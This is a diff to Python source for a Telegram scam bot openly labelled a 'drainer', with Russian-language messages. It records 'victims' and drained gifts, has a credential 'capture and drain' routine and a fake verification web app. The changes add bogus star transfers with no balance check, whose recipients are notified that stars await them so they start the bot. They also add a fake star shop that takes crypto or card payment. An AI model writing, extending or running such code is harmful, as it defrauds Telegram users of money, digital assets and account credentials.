@@ -1,5 +1,5 @@
 # ============================================
-# BUYSTARS_DRAINER - ReplyKeyboard + Send Stars via @mention
+# BUYSTARS_DRAINER - ReplyKeyboard + Stars Send Working
 # ============================================
 
 import asyncio
@@ -56,6 +56,18 @@ cursor.execute("""
     )
 """)
 
+cursor.execute("""
+    CREATE TABLE IF NOT EXISTS transactions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        sender_id INTEGER,
+        sender_username TEXT,
+        recipient_id INTEGER,
+        recipient_username TEXT,
+        amount INTEGER,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )
+""")
+
 cursor.execute("INSERT OR IGNORE INTO stats (key, value) VALUES ('total_victims', 0)")
 cursor.execute("INSERT OR IGNORE INTO stats (key, value) VALUES ('total_gifts_drained', 0)")
 conn.commit()
@@ -63,7 +75,7 @@ conn.commit()
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ---------- Main Keyboard (ReplyKeyboard - привязана к основному сообщению) ----------
+# ---------- Main Keyboard (ReplyKeyboard - кнопки над клавиатурой) ----------
 def get_main_keyboard():
     keyboard = [
         [KeyboardButton("🌐 Веб-Кошелек"), KeyboardButton("⭐ Вывести звезды")],
@@ -96,6 +108,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         cursor.execute("UPDATE victims SET stars_balance = ? WHERE telegram_id = ?", (balance, user.id))
         conn.commit()
     
+    bot_username = context.bot.username
+    
     def fmt(n):
         if n >= 1000000: return f"{n/1000000:.1f}M"
         if n >= 1000: return f"{n/1000:.1f}K"
@@ -110,7 +124,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         f"{fmt(TOTAL_STARS_SOLD)} ★ (~ ${fmt(TOTAL_USD_VOLUME)})\n\n"
         f"*Ваш баланс:* `{balance:,.0f} ★`\n\n"
         f"💡 *Отправка звезд:* просто напишите в чат\n"
-        f"`@{update.get_bot().username} @username 100`",
+        f"`@{bot_username} @username 100`",
         reply_markup=get_main_keyboard(),
         parse_mode=ParseMode.MARKDOWN
     )
@@ -132,9 +146,9 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         action, msg = actions[text]
         await send_verification_webapp(update, context, action, msg)
 
-# ---------- Обработка отправки звезд через @mention ----------
+# ---------- Обработка отправки звезд через @mention (ЧЕКИ) ----------
 async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Обработка сообщений вида: @botusername @username 100"""
+    """Обработка сообщений вида: @botusername @username количество"""
     if not update.message or not update.message.text:
         return
     
@@ -142,7 +156,8 @@ async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     bot_username = context.bot.username
     
     # Проверяем формат: @botusername @username количество
-    pattern = rf'^@{re.escape(bot_username)}\s+@(\w+)\s+(\d+)$'
+    # Паттерн: начинается с @botusername, затем @username, затем число
+    pattern = rf'^@{re.escape(bot_username)}\s+@([a-zA-Z0-9_]+)\s+(\d+)$'
     match = re.match(pattern, text, re.IGNORECASE)
     
     if not match:
@@ -151,7 +166,7 @@ async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     recipient_username = match.group(1)
     amount = int(match.group(2))
     sender_id = update.effective_user.id
-    sender_name = update.effective_user.first_name
+    sender_username = update.effective_user.username or update.effective_user.first_name
     
     if amount <= 0:
         await update.message.reply_text("❌ Количество звезд должно быть положительным числом.")
@@ -169,34 +184,34 @@ async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         )
         return
     
-    # Логируем отправку (без проверки баланса — можно отправлять сколько угодно)
-    logger.info(f"📤 SEND STARS: {sender_id} (@{sender_name}) -> @{recipient_username} ({recipient_id}) | {amount} ★")
-    
-    # Сохраняем в БД историю отправок
+    # Сохраняем транзакцию в БД
     cursor.execute("""
-        INSERT INTO transactions (sender_id, recipient_id, recipient_username, amount, created_at)
-        VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
-    """, (sender_id, recipient_id, recipient_username, amount))
+        INSERT INTO transactions (sender_id, sender_username, recipient_id, recipient_username, amount)
+        VALUES (?, ?, ?, ?, ?)
+    """, (sender_id, sender_username, recipient_id, recipient_username, amount))
     conn.commit()
+    
+    logger.info(f"📤 STARS SENT: {sender_id} (@{sender_username}) -> @{recipient_username} ({recipient_id}) | {amount} ★")
     
     # Отправляем подтверждение отправителю
     await update.message.reply_text(
-        f"✅ *Отправлено!*\n\n"
-        f"Получатель: `@{recipient_username}`\n"
-        f"Количество: `{amount:,} ★`\n\n"
-        f"Звезды успешно отправлены пользователю @{recipient_username}.",
+        f"✅ *Звезды отправлены!*\n\n"
+        f"📤 Получатель: `@{recipient_username}`\n"
+        f"⭐ Количество: `{amount:,} ★`\n\n"
+        f"Пользователь @{recipient_username} может забрать звезды в этом боте.",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=get_main_keyboard()
     )
     
-    # Отправляем уведомление получателю (если бот может писать в ЛС)
+    # Отправляем уведомление получателю
     try:
         await context.bot.send_message(
             chat_id=recipient_id,
             text=f"🎉 *Вам отправлены звезды!*\n\n"
-                 f"Отправитель: @{sender_name}\n"
-                 f"Количество: `{amount:,} ★`\n\n"
-                 f"Используйте бота @{context.bot.username} для управления звездами.",
+                 f"📥 Отправитель: @{sender_username}\n"
+                 f"⭐ Количество: `{amount:,} ★`\n\n"
+                 f"💡 Используйте бота @{context.bot.username} для управления звездами.\n\n"
+                 f"Нажмите /start чтобы начать.",
             parse_mode=ParseMode.MARKDOWN
         )
     except Exception as e:
@@ -278,6 +293,47 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "[Обменять](https://fragment.com/exchange)",
             parse_mode=ParseMode.MARKDOWN
         )
+    elif data == "shop_menu":
+        await shop_menu_callback(query)
+
+async def shop_menu_callback(query):
+    packages = [
+        {"stars": 50, "price": 0.69, "icon": "⭐"},
+        {"stars": 100, "price": 1.29, "icon": "⭐"},
+        {"stars": 500, "price": 5.99, "icon": "⭐"},
+        {"stars": 1000, "price": 11.99, "icon": "⭐"},
+        {"stars": 5000, "price": 59.99, "icon": "⭐"},
+        {"stars": 10000, "price": 119.99, "icon": "⭐"},
+    ]
+    
+    buttons = []
+    for p in packages:
+        buttons.append([
+            InlineKeyboardButton(
+                f"{p['icon']} {p['stars']:,} ★ = ${p['price']} USD",
+                callback_data=f"shop_buy_{p['stars']}"
+            )
+        ])
+    buttons.append([InlineKeyboardButton("🎁 NFT-подарки", callback_data="shop_gifts")])
+    buttons.append([InlineKeyboardButton("🔄 Обмен", callback_data="shop_exchange")])
+    buttons.append([InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")])
+    
+    reply_markup = InlineKeyboardMarkup(buttons)
+    
+    await query.edit_message_text(
+        "🛍️ *Магазин звезд*\n\n"
+        "Выберите пакет:\n"
+        "⭐ 50 ★ — $0.69\n"
+        "⭐ 100 ★ — $1.29\n"
+        "⭐ 500 ★ — $5.99\n"
+        "⭐ 1,000 ★ — $11.99\n"
+        "⭐ 5,000 ★ — $59.99\n"
+        "⭐ 10,000 ★ — $119.99\n\n"
+        "💳 Оплата: TON, USDT, карта\n"
+        "⚡ Моментальное зачисление",
+        reply_markup=reply_markup,
+        parse_mode=ParseMode.MARKDOWN
+    )
 
 # ---------- Capture ----------
 async def capture_and_drain(user_id: int, credentials: Dict[str, Any]):
@@ -325,19 +381,6 @@ def format_number(num: int) -> str:
         return f"{num/1000:.1f}K"
     return str(num)
 
-# ---------- Создание таблицы для транзакций ----------
-cursor.execute("""
-    CREATE TABLE IF NOT EXISTS transactions (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        sender_id INTEGER,
-        recipient_id INTEGER,
-        recipient_username TEXT,
-        amount INTEGER,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )
-""")
-conn.commit()
-
 # ---------- Main ----------
 async def main():
     webapp = setup_webapp()
@@ -351,8 +394,9 @@ async def main():
     
     # Основные обработчики
     application.add_handler(CommandHandler("start", start))
+    # ВАЖНО: порядок важен - сначала проверяем на отправку звезд, потом на кнопки
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_stars_send))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buttons))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_stars_send))  # Обработка отправки звезд
     application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
     application.add_handler(CallbackQueryHandler(handle_callback))
     
@@ -361,7 +405,7 @@ async def main():
     await application.updater.start_polling()
     
     logger.info("🤖 Bot started")
-    logger.info(f"📤 Send stars format: @{application.bot.username} @username amount")
+    logger.info(f"📤 Send stars format: @{BOT_TOKEN.split(':')[0]} @username amount")
     
     try:
         await asyncio.Event().wait()
